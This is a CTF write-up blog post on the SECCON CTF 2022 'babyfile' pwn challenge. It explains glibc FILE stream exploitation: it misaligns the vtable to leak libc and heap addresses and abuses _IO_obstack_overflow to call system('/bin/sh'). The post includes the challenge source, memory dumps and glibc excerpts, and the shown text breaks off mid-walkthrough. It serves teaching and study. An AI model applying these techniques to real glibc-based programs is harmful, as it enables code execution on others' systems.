<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>[SECCON CTF 2022 Quals] babyfile | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Introductionbabyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting">
<meta property="og:type" content="article">
<meta property="og:title" content="[SECCON CTF 2022 Quals] babyfile">
<meta property="og:url" content="https://n4sm.github.io/posts/babyfile/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Introductionbabyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-08-18T22:00:00.000Z">
<meta property="article:modified_time" content="2023-09-05T09:45:11.050Z">
<meta property="article:author" content="nasm">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="nasm">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="file stream">
<meta property="article:tag" content="SECCON">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.0.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/pic/wall.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>repr </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nasm </div>
      <div class="dot"></div>
      <div class="subtitle">pwn / kernel stuff </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box"></div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/posts/hello-world/" title="Hello World" >
            <div class="recent-link-text">
              Hello World
            </div>
          </a>
        
          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] window-of-opportunity
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-babyfile" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [SECCON CTF 2022 Quals] babyfile
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2022-08-18T22:00:00.000Z" itemprop="datePublished">2022-08-18</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            4k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SECCON/" rel="tag">SECCON</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/file-stream/" rel="tag">file stream</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>babyfile is a file stream exploitation I did during the <a target="_blank" rel="noopener" href="https://ctftime.org/event/1764">SECCON CTF 2022 Quals</a> event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution – I have not seen before – based on <code>_IO_obstack_jumps</code>! The related files can be found <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile">here</a>. If you’re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially <a href="../catastrophe">this one</a> and <a href="../filestream">this other one</a>.</p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>Populate base buffer with heap addresses with the help of <code>_IO_file_doallocate</code>.</li>
<li>Make both input and output buffer equal to the base buffer with the help of <code>_IO_file_underflow</code>.</li>
<li>Partial overwrite on right pointers to get a libc leak by simply flushing the file stream.</li>
<li>Leak a heap address by printing a pointer stored within the main_arena.</li>
<li><code>_IO_obstack_overflow</code> ends up calling a function pointer stored within the file stream we have control over which leads to a call primitive (plus control over the first argument). Then I just called <code>system(&quot;/bin/sh\x00&quot;)</code>.</li>
</ul>
<h1 id="What-we-have"><a href="#What-we-have" class="headerlink" title="What we have"></a>What we have</h1><p>The challenge is basically opening <code>/dev/null</code>, asking for an offset and a value to write at <code>fp + offset</code>. And we can freely flush <code>fp</code>. The source code is prodided:</p>
<p>Source code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getnline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getint</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	FILE *fp;</span><br><span class="line"></span><br><span class="line">	alarm(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">	write_str(<span class="string">&quot;Play with FILE structure\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!(fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line">		write_str(<span class="string">&quot;Open error&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	fp-&gt;_wide_data = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(;;)&#123;</span><br><span class="line">		<span class="keyword">switch</span>(menu())&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> END;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				fflush(fp);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">unsigned</span> <span class="type">char</span> ofs;</span><br><span class="line">					write_str(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line">					<span class="keyword">if</span>((ofs = getint()) &amp; <span class="number">0x80</span>)</span><br><span class="line">						ofs |= <span class="number">0x40</span>;</span><br><span class="line">					write_str(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">					((<span class="type">char</span>*)fp)[ofs] = getint();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		write_str(<span class="string">&quot;Done.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">	write_str(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">	_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">menu</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	write_str(<span class="string">&quot;\nMENU\n&quot;</span></span><br><span class="line">			<span class="string">&quot;1. Flush\n&quot;</span></span><br><span class="line">			<span class="string">&quot;2. Trick\n&quot;</span></span><br><span class="line">			<span class="string">&quot;0. Exit\n&quot;</span></span><br><span class="line">			<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> getint();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getnline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span>&#123;</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(size &lt;= <span class="number">0</span> || (len = read(STDIN_FILENO, buf, size<span class="number">-1</span>)) &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(buf[len<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		len--;</span><br><span class="line">	buf[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getint</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">	getnline(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	<span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Exploitation-ideas"><a href="#Exploitation-ideas" class="headerlink" title="Exploitation ideas"></a>Exploitation ideas</h1><p>I tried (in this order) to:</p>
<ul>
<li>Get a libc leak by calling <code>_IO_file_underflow</code> to make input and output buffers equal to the base buffer that contains with the help of <code>_IO_file_doallocate</code> a heap address. And then flushing the file stream to leak the libc.</li>
<li>Get a heap leak by leaking a heap pointer stored within the <code>main_arena</code>.</li>
<li>Get an arbitrary write with a tcache dup technique, I got <code>__free_hook</code> as the last pointer available in the target tcache bin but I didn’t succeeded to get a shell &gt;.&lt;.</li>
<li>Call primitive with control over the first argument by calling <code>_IO_obstack_overflow</code> (part of the <code>_IO_obstack_jumps</code> vtable). Then it allows us to call <code>system(&quot;/bin/sh\x00&quot;)</code>.</li>
</ul>
<h2 id="Libc-leak"><a href="#Libc-leak" class="headerlink" title="Libc leak"></a>Libc leak</h2><p>To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we’re looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable in such a way that <code>fp-&gt;vtable-&gt;sync()</code> calls <code>_IO_default_doallocate</code>. Then <code>_IO_default_doallocate</code> is called and does some operations:</p>
<p>The initial state of the file stream looks like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x559c0955e2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0</span><br><span class="line">0x559c0955e310: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x559c0955e320: 0x0000000000000000      0x0000559c0955e380</span><br><span class="line">0x559c0955e330: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x559c0955e340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8</span><br><span class="line">0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580</span><br></pre></td></tr></table></figure>

<p>It initializes the base buffer to a fresh <code>BUFSIZE</code> allocated buffer.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line"></span><br><span class="line">  buf = <span class="built_in">malloc</span>(BUFSIZ);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (buf == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, buf, buf+BUFSIZ, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fp state after the _IO_default_doallocate:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x559c0955e2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e2d0: 0x0000000000000000      0x0000559c0955e480</span><br><span class="line">0x559c0955e2e0: 0x0000559c09560480      0x0000000000000000</span><br><span class="line">0x559c0955e2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0</span><br><span class="line">0x559c0955e310: 0x0000000000000003      0x0000000000000000</span><br><span class="line">0x559c0955e320: 0x0000000000000000      0x0000559c0955e380</span><br><span class="line">0x559c0955e330: 0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x559c0955e340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8</span><br><span class="line">0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580</span><br></pre></td></tr></table></figure>

<p>Once we have a valid pointer into the base buffer, we try to get into both the input and output buffer the base pointer.<br>Given the input &#x2F; output buffer are <code>NULL</code> and that <code>fp-&gt;flags</code> is <code>0xfbad1800 | 0x8000</code> (plus <code>0x8000</code> &#x3D;&gt; <code>_IO_USER_LOCK</code> to not stuck into <code>fflush</code>), we do not have issues with the checks. The issue with the <code>_IO_SYSREAD</code> call is described in the code below.</p>
<p><code>_IO_new_file_underflow</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Given the vtable is misaligned, _IO_SYSREAD will call </span></span><br><span class="line"><span class="comment">  _IO_default_pbackfail, the code is given after _IO_new_file_underflow */</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>

<p><code>_IO_default_pbackfail</code>:</p>
